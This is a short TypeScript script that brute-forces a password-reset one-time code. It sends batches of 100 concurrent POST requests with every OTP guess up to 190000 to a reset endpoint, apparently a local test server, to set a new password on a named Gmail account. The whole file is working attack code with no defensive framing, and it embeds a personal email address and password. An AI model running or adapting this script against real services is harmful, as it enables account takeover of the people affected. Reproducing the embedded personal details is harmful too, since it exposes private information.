import express, { Request, Response } from "express"
import axios from "axios"
const app = express();


let flag = 1;
async function attack(otp: string) {
    let data = JSON.stringify({
        "email": "himanshudangwal99@gmail.com",
        "otp": otp,
        "newPassword": "Himanshu"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };
    // console.log(config)
    try {
        let response = await axios.request(config);
        console.log(response.data.flag)
        if (response.data.flag == "1") {
            flag = 0;
            console.log("Here")
        }
    } catch (error) {

    }

}

async function helper() {
    for (let i = 0; i < 190000; i += 100) {
        let flag2 = 0;
        const p = [];
        for (let j = 0; j < 100; j++) {
            p.push(attack((i + j).toString()));
            if (flag == 0) {
                flag2 = 1;
                break;
            }
        }

        await Promise.all(p);

        if (flag2) break;
    }
}


helper()